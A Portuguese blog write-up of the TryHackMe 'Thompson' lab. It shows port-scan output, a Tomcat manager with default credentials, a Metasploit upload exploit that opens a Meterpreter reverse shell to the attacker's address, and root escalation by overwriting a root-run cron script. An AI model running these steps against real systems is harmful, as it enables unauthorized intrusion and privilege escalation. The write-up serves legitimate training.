---
title: 'TryHackMe: Thompson'
author: Kertonli
categories: [TryHackMe]
tags: [Fácil, Rustscan, Nmap, ]
image:
  path: assets/images/tryhackme/thompson/room.png
---

Bom dia! Mais um desafio direto do forno.

Vamos começar com o famoso rustscan + nmap full:

```

┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.60.194 -- -A -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports like it's my full-time job. Wait, it is.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.60.194:22
Open 10.10.60.194:8009
Open 10.10.60.194:8080
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A -sC -sV" on ip 10.10.60.194
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-11 14:29 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Initiating Ping Scan at 14:29
Scanning 10.10.60.194 [4 ports]
Completed Ping Scan at 14:29, 0.28s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:29
Completed Parallel DNS resolution of 1 host. at 14:29, 0.14s elapsed
DNS resolution of 1 IPs took 0.14s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 14:29
Scanning 10.10.60.194 [3 ports]
Discovered open port 8080/tcp on 10.10.60.194
Discovered open port 8009/tcp on 10.10.60.194
Discovered open port 22/tcp on 10.10.60.194
Completed SYN Stealth Scan at 14:29, 0.30s elapsed (3 total ports)
Initiating Service scan at 14:29
Scanning 3 services on 10.10.60.194
Completed Service scan at 14:29, 8.45s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.60.194
Retrying OS detection (try #2) against 10.10.60.194
Initiating Traceroute at 14:29
Completed Traceroute at 14:29, 0.34s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 14:29
Completed Parallel DNS resolution of 2 hosts. at 14:29, 0.04s elapsed
DNS resolution of 2 IPs took 0.04s. Mode: Async [#: 2, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.60.194.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:29
Completed NSE at 14:29, 7.49s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:29
Completed NSE at 14:29, 1.13s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Nmap scan report for 10.10.60.194
Host is up, received reset ttl 63 (0.22s latency).
Scanned at 2025-03-11 14:29:11 EDT for 23s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL+0hfJnh2z0jia21xVo/zOSRmzqE/qWyQv1G+8EJNXze3WPjXsC54jYeO0lp2SGq+sauzNvmWrHcrLKHtugMUQmkS9gD/p4zx4LjuG0WKYYeyLybs4WrTTmCU8PYGgmud9SwrDlEjX9AOEZgP/gj1FY+x+TfOtIT2OEE0Exvb86LhPj/AqdahABfCfxzHQ9ZyS6v4SMt/AvpJs6Dgady20CLxhYGY9yR+V4JnNl4jxwg2j64EGLx4vtCWNjwP+7ROkTmP6dzR7DxsH1h8Ko5C45HbTIjFzUmrJ1HMPZMo9ss0MsmeXPnZTmp5TxsxbLNJGSbDv7BS9gdCyTf0+Qq1
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG6CiO2B7Uei2whKgUHjLmGY7dq1uZFhZ3wY5EWj5L7ylSj+bx5pwaiEgU/Velkp4ZWXM//thL6K1lAAPGLxHMM=
|   256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIwYtK4oCnQLSoBYAztlgcEsq8FLNL48LyxC2RfxC+33
8009/tcp open  ajp13   syn-ack ttl 63 Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    syn-ack ttl 63 Apache Tomcat 8.5.5
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 5.4 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 5.1 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=3/11%OT=22%CT=%CU=30358%PV=Y%DS=2%DC=T%G=N%TM=67D0810E%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)
OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.003 days (since Tue Mar 11 14:25:57 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   328.48 ms 10.8.0.1
2   328.55 ms 10.10.60.194

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.47 seconds
           Raw packets sent: 62 (4.324KB) | Rcvd: 43 (3.156KB)

```

Ok, acessando a porta 8080 no browser:

![alt text](assets/images/tryhackme/thompson/image1.png)

Temos aqui um serviço apache tomcat totalmente desprogido. Clicando em Manager App temos um formulário pedindo login e senha.

Cancelando a solicitação recebemos a mensagem de erro:

![alt text](assets/images/tryhackme/thompson/image3.png)

Como o painel está completamente desconfigurado, ele nos fornece o login e senha de administrador. Com isso, podemos usar um exploit do MetasploitFramework que exige o login e senha de administrador para obtermos um Remote Code Execution.

```
msf6 exploit(multi/http/tomcat_mgr_upload) > show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/tomcat_mgr_upload) > set rhost 10.10.60.194
rhost => 10.10.60.194
msf6 exploit(multi/http/tomcat_mgr_upload) > set rport 8080
rport => 8080
msf6 exploit(multi/http/tomcat_mgr_upload) > set httppassword s3cret
httppassword => s3cret
msf6 exploit(multi/http/tomcat_mgr_upload) > set httpusername tomcat
httpusername => tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set lhost tun0
lhost => 10.8.44.19
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit
[*] Started reverse TCP handler on 10.8.44.19:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying R7ysSryOEXbbZxvxJNTbOBiZtR...
[*] Executing R7ysSryOEXbbZxvxJNTbOBiZtR...
[*] Sending stage (58073 bytes) to 10.10.60.194
[*] Undeploying R7ysSryOEXbbZxvxJNTbOBiZtR ...
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (10.8.44.19:4444 -> 10.10.60.194:48926) at 2025-03-11 14:46:39 -0400

meterpreter > 

```

Ok, agora temos acesso total à máquina. Só mandar um cat user.txt ( dentro de ~/home/jack ) que já temos a primeira resposta.

Para a segunda resposta podemos verificar que existem dois arquivos estranhos nessa mesma pasta: id.sh (Executável) e test.txt

Ao observar o conteúdo dos dois arquivos fica claro que o id.sh está executando o comando id como root e salvando a resposta no test.txt

Se analisarmos o conteúdo de /etc/crontab também podemos verificar que esse arquivo fica sendo executado de tempos em tempos pelo usuário root.

```

meterpreter > cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    cd /home/jack && bash id.sh


```

Nós também temos permissão para modificar o conteúdo desse arquivo então é isso que vamos fazer.

```
meterpreter > shell
echo "#!/bin/bash\ncat /root/root.txt > test.txt" > id.sh
cat test.txt
```

Desafio Concluído!

![alt text](assets/images/tryhackme/thompson/image4.png)